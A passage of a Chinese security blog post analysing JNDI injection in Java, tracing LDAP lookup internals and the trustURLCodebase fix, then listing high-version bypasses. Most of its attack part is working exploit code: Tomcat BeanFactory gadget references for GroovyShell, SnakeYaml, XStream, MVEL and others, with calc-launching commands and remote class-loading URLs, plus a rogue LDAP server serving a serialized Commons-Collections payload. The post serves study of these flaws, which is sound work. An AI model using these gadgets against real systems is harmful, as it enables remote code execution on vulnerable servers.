+        InitialContext initialContext = new InitialContext();
+        initialContext.lookup(url);
+    &#125;
+
+&#125;
+</code></pre>
+<h4 id="原理分析-1"><a href="#原理分析-1" class="headerlink" title="原理分析"></a>原理分析</h4><p>InitialContext#lookup中会调用对应协议xxxContext的方法,来到<code>ldapURLContext#lookup</code>，调用super.lookup(var1)，后面调用一大堆lookup，我们看一下方法栈，来到核心LdapCtx#c_lookup</p>
+<p><img src="/images/20230502000820.png"></p>
+<p>lookup 获取Entry后，一路传参 到c_lookup，在doSearchOnce中发起对传入的url发起请求，获取对应的Entry，判断javaclassname、javaNamingReference不为空的时候进行decodeObject处理，进行解析，attrs里可以看到我们的cn:test</p>
+<p><img src="/images/20230502001916.png"></p>
+<p>deocodeOject会进行判断，不同类型的对象调用不同的方法，我们是个引用，所以会调用decodeReference方法</p>
+<p><img src="/images/20230502002454.png"></p>
+<p>获取类名，地址，返回这个Reference对象，解析Reference完毕</p>
+<p><img src="/images/20230502002631.png"></p>
+<p>返回到LdapCtx#c_lookup，对这个Reference进行查找，调用DirectoryManager.getObjectInstance</p>
+<blockquote>
+<p>注意这个DirectoryManager,JNDI分为了Naming和Directory，对应的命名服务和目录服务,而RMI调用的NamingManager，这里就是个体现</p>
+</blockquote>
+<p><img src="/images/20230502003130.png"></p>
+<p>DirectoryManager也是调用getObjectFactoryFromReference，和NamingManager如出一辙，后面逻辑都一样，这里就不再追了。</p>
+<h4 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h4><p>javax.naming.spi.NamingManager#getObjectFactoryFromReference从codebase中加载类时调用VersionHelper#loadClass</p>
+<p><img src="/images/20230502005335.png"></p>
+<p>com.sun.naming.internal.VersionHelper12#loadClass(java.lang.String, java.lang.String)高版本中会判断trustURLCodebase是否为true</p>
+<p><img src="/images/20230502005218.png"></p>
+<h2 id="高版本绕过"><a href="#高版本绕过" class="headerlink" title="高版本绕过"></a>高版本绕过</h2><h3 id="Tomcat-Embed-Core依赖加载本地BeanFactory绕过"><a href="#Tomcat-Embed-Core依赖加载本地BeanFactory绕过" class="headerlink" title="Tomcat Embed Core依赖加载本地BeanFactory绕过"></a>Tomcat Embed Core依赖加载本地BeanFactory绕过</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>Tomcat Embed Core作为一个常用的依赖它的BeanFactory中的getObjectInstance方法提供了一个不安全的反射调用，并且参数可控，导致可以利用</p>
+<pre><code>public Object getObjectInstance(Object obj, Name name, Context nameCtx,
+                                Hashtable&lt;?,?&gt; environment)
+    throws NamingException &#123;
+
+    if (obj instanceof ResourceRef) &#123; // 判断obj对象是否是ResourceRef
+
+        try &#123;
+
+            Reference ref = (Reference) obj;
+            String beanClassName = ref.getClassName(); // 获取ref中className属性
+            Class&lt;?&gt; beanClass = null;
+            ClassLoader tcl = Thread.currentThread().getContextClassLoader();
+            if (tcl != null) &#123;
+                try &#123;
+                    beanClass = tcl.loadClass(beanClassName);
+                &#125; catch(ClassNotFoundException e) &#123;
+                &#125;
+            &#125; else &#123;
+                try &#123;
+                    beanClass = Class.forName(beanClassName);  // 本地加载对应的Class对象
+                &#125; catch(ClassNotFoundException e) &#123;
+                    e.printStackTrace();
+                &#125;
+            &#125;
+            if (beanClass == null) &#123;
+                throw new NamingException
+                    (&quot;Class not found: &quot; + beanClassName);
+            &#125;
+
+            BeanInfo bi = Introspector.getBeanInfo(beanClass);  // 获取相关Class的信息
+            PropertyDescriptor[] pda = bi.getPropertyDescriptors(); // 获取相关参数
+
+            Object bean = beanClass.newInstance(); // 实例化对应的className，获得一个对象，那么我们利用的类有个前提条件就是该beanClass对象存在一个公有的无参构造函数
+
+            /* Look for properties with explicitly configured setter */
+            RefAddr ra = ref.get(&quot;forceString&quot;); // 获取forceString字符串
+            Map&lt;String, Method&gt; forced = new HashMap&lt;&gt;();
+            String value;
+
+            if (ra != null) &#123;
+                value = (String)ra.getContent(); // 获取forceString中的值
+                Class&lt;?&gt; paramTypes[] = new Class[1]; // 存储下面的String.class，那么我们利用的类有个前提条件，对应方法的第一个参数为String类型
+                paramTypes[0] = String.class;
+                String setterName;
+                int index;
+
+                /* Items are given as comma separated list */
+                for (String param: value.split(&quot;,&quot;)) &#123;  // 通过“，”来进行切分
+                    param = param.trim();
+                    /* A single item can either be of the form name=method
+                     * or just a property name (and we will use a standard
+                     * setter) */
+                    index = param.indexOf(&#39;=&#39;); // 如果param中有“=”符号的话
+                    if (index &gt;= 0) &#123;
+                        setterName = param.substring(index + 1).trim(); // setterName=eval
+                        param = param.substring(0, index).trim(); // param=KINGX
+                    &#125; else &#123;
+                        setterName = &quot;set&quot; + param.substring(0, 1).toUpperCase(Locale.ENGLISH) +
+                                     param.substring(1);
+                    &#125;
+                    try &#123;
+                        forced.put(param, beanClass.getMethod(setterName, paramTypes));  // KINGS=eval（方法）
+                    &#125; catch (NoSuchMethodException|SecurityException ex) &#123;
+                        throw new NamingException
+                            (&quot;Forced String setter &quot; + setterName +
+                             &quot; not found for property &quot; + param);
+                    &#125;
+                &#125;
+            &#125;
+
+            Enumeration&lt;RefAddr&gt; e = ref.getAll(); // 获取ref中所有的字符串
+
+            while (e.hasMoreElements()) &#123;
+
+                ra = e.nextElement();
+                String propName = ra.getType();
+
+                if (propName.equals(Constants.FACTORY) ||
+                    propName.equals(&quot;scope&quot;) || propName.equals(&quot;auth&quot;) ||
+                    propName.equals(&quot;forceString&quot;) ||
+                    propName.equals(&quot;singleton&quot;)) &#123;
+                    continue;
+                &#125;
+
+                value = (String)ra.getContent();
+
+                Object[] valueArray = new Object[1];
+
+                /* Shortcut for properties with explicitly configured setter */
+                Method method = forced.get(propName); // 获取到eval（方法）
+                if (method != null) &#123;
+                    valueArray[0] = value;  // value也是我们可控的，此时value则是执行命令的字符串
+                    try &#123;
+                        method.invoke(bean, valueArray); // 最终执行命令即可触发
+                    &#125; catch (IllegalAccessException|
+                             IllegalArgumentException|
+                             InvocationTargetException ex) &#123;
+                        throw new NamingException
+                            (&quot;Forced String setter &quot; + method.getName() +
+                             &quot; threw exception for property &quot; + propName);
+                    &#125;
+                    continue;
+                &#125;
+            ....    
+            ....
+
+&#125;
+</code></pre>
+<p><img src="/images/20230502010730.png"></p>
+<h4 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h4><p>TomcatBeanFactoryBypass</p>
+<pre><code>public class TomcatBeanFactoryBypass &#123;
+    public static void main(String[] args) throws Exception &#123;
+        InitialContext initialContext = new InitialContext();
+        // 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory
+        ResourceRef ref = new ResourceRef(&quot;javax.el.ELProcessor&quot;, null, &quot;&quot;, &quot;&quot;, true, &quot;org.apache.naming.factory.BeanFactory&quot;, null);
+
+        // 强制将 &#39;x&#39; 属性的setter 从 &#39;x&#39; 变为 &#39;eval&#39;, 详细逻辑见 BeanFactory.getObjectInstance 代码
+        ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;x=eval&quot;));
+
+        // 指定x属性指定其setter方法需要的参数，实际是ElProcessor.eval方法执行的参数，利用表达式执行命令
+        ref.add(new StringRefAddr(&quot;x&quot;, &quot;Runtime.getRuntime().exec(&#39;calc&#39;)&quot;));
+
+        initialContext.rebind(&quot;rmi://localhost:1099/remote&quot;, ref);  // 绑定目录名
+    &#125;
+&#125;
+</code></pre>
+<h4 id="常用的利用类"><a href="#常用的利用类" class="headerlink" title="常用的利用类"></a>常用的利用类</h4><h5 id="groovy-lang-GroovyShell-evaluate"><a href="#groovy-lang-GroovyShell-evaluate" class="headerlink" title="groovy.lang.GroovyShell#evaluate"></a>groovy.lang.GroovyShell#evaluate</h5><pre><code>ResourceRef ref = new ResourceRef(&quot;groovy.lang.GroovyShell&quot;, null, &quot;&quot;, &quot;&quot;, true,&quot;org.apache.naming.factory.BeanFactory&quot;,null);
+ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;x=evaluate&quot;));
+ref.add(new StringRefAddr(&quot;x&quot;, &quot;&#39;calc&#39;.execute()&quot;));
+</code></pre>
+<h5 id="javax-management-loading-MLet"><a href="#javax-management-loading-MLet" class="headerlink" title="javax.management.loading.MLet"></a>javax.management.loading.MLet</h5><pre><code>private static ResourceRef tomcatMLet() &#123;
+    ResourceRef ref = new ResourceRef(&quot;javax.management.loading.MLet&quot;, null, &quot;&quot;, &quot;&quot;,
+            true, &quot;org.apache.naming.factory.BeanFactory&quot;, null);
+    ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;a=loadClass,b=addURL,c=loadClass&quot;));
+    ref.add(new StringRefAddr(&quot;a&quot;, &quot;javax.el.ELProcessor&quot;));
+    ref.add(new StringRefAddr(&quot;b&quot;, &quot;http://127.0.0.1:2333/&quot;));
+    ref.add(new StringRefAddr(&quot;c&quot;, &quot;Blue&quot;));
+    return ref;
+&#125;
+</code></pre>
+<h5 id="GroovyClassLoader"><a href="#GroovyClassLoader" class="headerlink" title="GroovyClassLoader"></a>GroovyClassLoader</h5><pre><code>private static ResourceRef tomcatGroovyClassLoader() &#123;
+    ResourceRef ref = new ResourceRef(&quot;groovy.lang.GroovyClassLoader&quot;, null, &quot;&quot;, &quot;&quot;,
+            true, &quot;org.apache.naming.factory.BeanFactory&quot;, null);
+    ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;a=addClasspath,b=loadClass&quot;));
+    ref.add(new StringRefAddr(&quot;a&quot;, &quot;http://127.0.0.1:8888/&quot;));
+    ref.add(new StringRefAddr(&quot;b&quot;, &quot;blue&quot;));
+    return ref;
+&#125;
+</code></pre>
+<h5 id="SnakeYaml"><a href="#SnakeYaml" class="headerlink" title="SnakeYaml"></a>SnakeYaml</h5><pre><code>private static ResourceRef tomcat_snakeyaml()&#123;
+    ResourceRef ref = new ResourceRef(&quot;org.yaml.snakeyaml.Yaml&quot;, null, &quot;&quot;, &quot;&quot;,
+            true, &quot;org.apache.naming.factory.BeanFactory&quot;, null);
+    String yaml = &quot;!!javax.script.ScriptEngineManager [\n&quot; +
+            &quot;  !!java.net.URLClassLoader [[\n&quot; +
+            &quot;    !!java.net.URL [\&quot;http://127.0.0.1:8888/exp.jar\&quot;]\n&quot; +
+            &quot;  ]]\n&quot; +
+            &quot;]&quot;;
+    ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;a=load&quot;));
+    ref.add(new StringRefAddr(&quot;a&quot;, yaml));
+    return ref;
+&#125;
+</code></pre>
+<h5 id="XStream"><a href="#XStream" class="headerlink" title="XStream"></a>XStream</h5><pre><code>private static ResourceRef tomcat_xstream()&#123;
+    ResourceRef ref = new ResourceRef(&quot;com.thoughtworks.xstream.XStream&quot;, null, &quot;&quot;, &quot;&quot;,
+            true, &quot;org.apache.naming.factory.BeanFactory&quot;, null);
+    String xml = &quot;&lt;java.util.PriorityQueue serialization=&#39;custom&#39;&gt;\n&quot; +
+            &quot;  &lt;unserializable-parents/&gt;\n&quot; +
+            &quot;  &lt;java.util.PriorityQueue&gt;\n&quot; +
+            &quot;    &lt;default&gt;\n&quot; +
+            &quot;      &lt;size&gt;2&lt;/size&gt;\n&quot; +
+            &quot;    &lt;/default&gt;\n&quot; +
+            &quot;    &lt;int&gt;3&lt;/int&gt;\n&quot; +
+            &quot;    &lt;dynamic-proxy&gt;\n&quot; +
+            &quot;      &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;\n&quot; +
+            &quot;      &lt;handler class=&#39;sun.tracing.NullProvider&#39;&gt;\n&quot; +
+            &quot;        &lt;active&gt;true&lt;/active&gt;\n&quot; +
+            &quot;        &lt;providerType&gt;java.lang.Comparable&lt;/providerType&gt;\n&quot; +
+            &quot;        &lt;probes&gt;\n&quot; +
+            &quot;          &lt;entry&gt;\n&quot; +
+            &quot;            &lt;method&gt;\n&quot; +
+            &quot;              &lt;class&gt;java.lang.Comparable&lt;/class&gt;\n&quot; +
+            &quot;              &lt;name&gt;compareTo&lt;/name&gt;\n&quot; +
+            &quot;              &lt;parameter-types&gt;\n&quot; +
+            &quot;                &lt;class&gt;java.lang.Object&lt;/class&gt;\n&quot; +
+            &quot;              &lt;/parameter-types&gt;\n&quot; +
+            &quot;            &lt;/method&gt;\n&quot; +
+            &quot;            &lt;sun.tracing.dtrace.DTraceProbe&gt;\n&quot; +
+            &quot;              &lt;proxy class=&#39;java.lang.Runtime&#39;/&gt;\n&quot; +
+            &quot;              &lt;implementing__method&gt;\n&quot; +
+            &quot;                &lt;class&gt;java.lang.Runtime&lt;/class&gt;\n&quot; +
+            &quot;                &lt;name&gt;exec&lt;/name&gt;\n&quot; +
+            &quot;                &lt;parameter-types&gt;\n&quot; +
+            &quot;                  &lt;class&gt;java.lang.String&lt;/class&gt;\n&quot; +
+            &quot;                &lt;/parameter-types&gt;\n&quot; +
+            &quot;              &lt;/implementing__method&gt;\n&quot; +
+            &quot;            &lt;/sun.tracing.dtrace.DTraceProbe&gt;\n&quot; +
+            &quot;          &lt;/entry&gt;\n&quot; +
+            &quot;        &lt;/probes&gt;\n&quot; +
+            &quot;      &lt;/handler&gt;\n&quot; +
+            &quot;    &lt;/dynamic-proxy&gt;\n&quot; +
+            &quot;    &lt;string&gt;/System/Applications/Calculator.app/Contents/MacOS/Calculator&lt;/string&gt;\n&quot; +
+            &quot;  &lt;/java.util.PriorityQueue&gt;\n&quot; +
+            &quot;&lt;/java.util.PriorityQueue&gt;&quot;;
+    ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;a=fromXML&quot;));
+    ref.add(new StringRefAddr(&quot;a&quot;, xml));
+    return ref;
+&#125;
+</code></pre>
+<h5 id="MVEL"><a href="#MVEL" class="headerlink" title="MVEL"></a>MVEL</h5><pre><code>private static ResourceRef tomcat_MVEL()&#123;
+    ResourceRef ref = new ResourceRef(&quot;org.mvel2.sh.ShellSession&quot;, null, &quot;&quot;, &quot;&quot;,
+            true, &quot;org.apache.naming.factory.BeanFactory&quot;, null);
+    ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;a=exec&quot;));
+    ref.add(new StringRefAddr(&quot;a&quot;,
+            &quot;push Runtime.getRuntime().exec(&#39;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#39;);&quot;));
+    return ref;
+&#125;
+</code></pre>
+<h5 id="NativeLibLoader"><a href="#NativeLibLoader" class="headerlink" title="NativeLibLoader"></a>NativeLibLoader</h5><pre><code>private static ResourceRef tomcat_loadLibrary()&#123;
+    ResourceRef ref = new ResourceRef(&quot;com.sun.glass.utils.NativeLibLoader&quot;, null, &quot;&quot;, &quot;&quot;,
+            true, &quot;org.apache.naming.factory.BeanFactory&quot;, null);
+    ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;a=loadLibrary&quot;));
+    ref.add(new StringRefAddr(&quot;a&quot;, &quot;/../../../../../../../../../../../../tmp/libcmd&quot;));
+    return ref;
+&#125;
+</code></pre>
+<h3 id="LDAP反序列化绕过"><a href="#LDAP反序列化绕过" class="headerlink" title="LDAP反序列化绕过"></a>LDAP反序列化绕过</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>来到解析Reference相同的地方Obj#decodeObject，判断如果是序列化数据就会调用deserializeObject</p>
+<p><img src="/images/20230502170832.png"></p>
+<p>deserializeObject中触发反序列化</p>
+<p><img src="/images/20230502171123.png"></p>
+<h4 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h4><p>LDAPServerBypass：</p>
+<pre><code>public class LDAPServerBypass &#123;
+    private static final String LDAP_BASE = &quot;dc=example,dc=com&quot;;
+
+
+    public static void main (String[] args) &#123;
+
+        int port = 1234;
+
+
+        try &#123;
+            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
+            config.setListenerConfigs(new InMemoryListenerConfig(
+                    &quot;listen&quot;,
+                    InetAddress.getByName(&quot;0.0.0.0&quot;),
+                    port,
+                    ServerSocketFactory.getDefault(),
+                    SocketFactory.getDefault(),
+                    (SSLSocketFactory) SSLSocketFactory.getDefault()));
+
+            config.addInMemoryOperationInterceptor(new OperationInterceptor());
+            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
+            System.out.println(&quot;Listening on 0.0.0.0:&quot; + port);
+            ds.startListening();
+
+        &#125;
+        catch ( Exception e ) &#123;
+            e.printStackTrace();
+        &#125;
+    &#125;
+
+    private static class OperationInterceptor extends InMemoryOperationInterceptor &#123;
+
+        @Override
+        public void processSearchResult ( InMemoryInterceptedSearchResult result ) &#123;
+            String base = result.getRequest().getBaseDN();
+            Entry e = new Entry(base);
+            try &#123;
+                e.addAttribute(&quot;javaClassName&quot;, &quot;test&quot;);
+                e.addAttribute(&quot;javaSerializedData&quot;, Base64.decode(&quot;rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRv&quot; +
+                        &quot;cmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznB&quot; +
+                        &quot;H9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4&quot; +
+                        &quot;cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSC&quot; +
+                        &quot;nnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5z&quot; +
+                        &quot;Zm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFp&quot; +
+                        &quot;bmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUv&quot; +
+                        &quot;Y29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9u&quot; +
+                        &quot;cy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hl&quot; +
+                        &quot;LmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGU&quot; +
+                        &quot;AgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBz&quot; +
+                        &quot;cgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zv&quot; +
+                        &quot;cm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5h&quot; +
+                        &quot;bWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNz&quot; +
+                        &quot;O3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1&quot; +
+                        &quot;cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsA&quot; +
+                        &quot;AAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAA&quot; +
+                        &quot;AnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAA&quot; +
+                        &quot;AAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAA&quot; +
+                        &quot;AAF0AARjYWxjdAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdl&quot; +
+                        &quot;chLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAB&quot; +
+                        &quot;c3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xk&quot; +
+                        &quot;eHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg=&quot;));
+                result.sendSearchEntry(e);
+                result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
+            &#125;
+            catch ( Exception e1 ) &#123;
+                e1.printStackTrace();
+            &#125;
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/java%E5%AE%89%E5%85%A8/" rel="tag"><i class="fas fa-tag"></i> java安全</a>
+          
+            <a href="/tags/JNDI/" rel="tag"><i class="fas fa-tag"></i> JNDI</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div>
+	  <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    1azysugar
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://1azy.icu/2023/04/15/JNDI-Injection/" title="JNDI注入原理分析">http://1azy.icu/2023/04/15/JNDI-Injection/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议，转载请注明出处！
+  </li>
+</ul>
+
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2023/04/03/Java-RMI/" rel="next" title="Java RMI攻击原理分析">
+                <i class="fas fa-chevron-left"></i> Java RMI攻击原理分析
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2023/05/03/fastjson/" rel="prev" title="fastjson全版本漏洞分析">
+                fastjson全版本漏洞分析 <i class="fas fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+	        <img class="site-author-image" itemprop="image"
+                  src="/images/avatar.jpg"
+                  alt="" />
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/lazysugar" target="_blank" title="GitHub">
+                      
+		      
+			<i class="fa-fw fab fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:1613664134@qq.com" target="_blank" title="E-Mail">
+                      
+		      
+			<i class="fa-fw fas fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+            <div class="cc-license motion-element" itemprop="license">
+              <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" target="_blank">
+                <img src="/images/cc-by-nc-sa.svg" alt="Creative Commons" />
+              </a>
+            </div>
+          
+
+          
+          
+
+          
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#JNDI%E7%AE%80%E4%BB%8B"><span class="nav-number">1.</span> <span class="nav-text">JNDI简介</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#JNDI-RMI"><span class="nav-number">1.1.</span> <span class="nav-text">JNDI+RMI</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#RMI%E8%AF%A6%E8%A7%A3"><span class="nav-number">1.1.1.</span> <span class="nav-text">RMI详解</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%87%E7%A8%8B%E6%8B%86%E8%A7%A3"><span class="nav-number">1.2.</span> <span class="nav-text">过程拆解</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#RMI-registry"><span class="nav-number">1.2.1.</span> <span class="nav-text">RMI registry</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BBJNDI"><span class="nav-number">1.2.2.</span> <span class="nav-text">攻击JNDI</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Reference"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">Reference</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BE%8B%E5%AD%90"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">例子</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="nav-number">1.2.2.3.</span> <span class="nav-text">原理分析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JNDI-LDAP"><span class="nav-number">1.2.3.</span> <span class="nav-text">JNDI+LDAP</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%A4%BA%E4%BE%8B"><span class="nav-number">1.2.3.1.</span> <span class="nav-text">示例</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90-1"><span class="nav-number">1.2.3.2.</span> <span class="nav-text">原理分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D"><span class="nav-number">1.2.3.3.</span> <span class="nav-text">修复</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87"><span class="nav-number">1.3.</span> <span class="nav-text">高版本绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Tomcat-Embed-Core%E4%BE%9D%E8%B5%96%E5%8A%A0%E8%BD%BD%E6%9C%AC%E5%9C%B0BeanFactory%E7%BB%95%E8%BF%87"><span class="nav-number">1.3.1.</span> <span class="nav-text">Tomcat Embed Core依赖加载本地BeanFactory绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">1.3.1.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%A4%BA%E4%BE%8B-1"><span class="nav-number">1.3.1.2.</span> <span class="nav-text">示例</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E7%9A%84%E5%88%A9%E7%94%A8%E7%B1%BB"><span class="nav-number">1.3.1.3.</span> <span class="nav-text">常用的利用类</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#groovy-lang-GroovyShell-evaluate"><span class="nav-number">1.3.1.3.1.</span> <span class="nav-text">groovy.lang.GroovyShell#evaluate</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#javax-management-loading-MLet"><span class="nav-number">1.3.1.3.2.</span> <span class="nav-text">javax.management.loading.MLet</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#GroovyClassLoader"><span class="nav-number">1.3.1.3.3.</span> <span class="nav-text">GroovyClassLoader</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#SnakeYaml"><span class="nav-number">1.3.1.3.4.</span> <span class="nav-text">SnakeYaml</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#XStream"><span class="nav-number">1.3.1.3.5.</span> <span class="nav-text">XStream</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#MVEL"><span class="nav-number">1.3.1.3.6.</span> <span class="nav-text">MVEL</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" 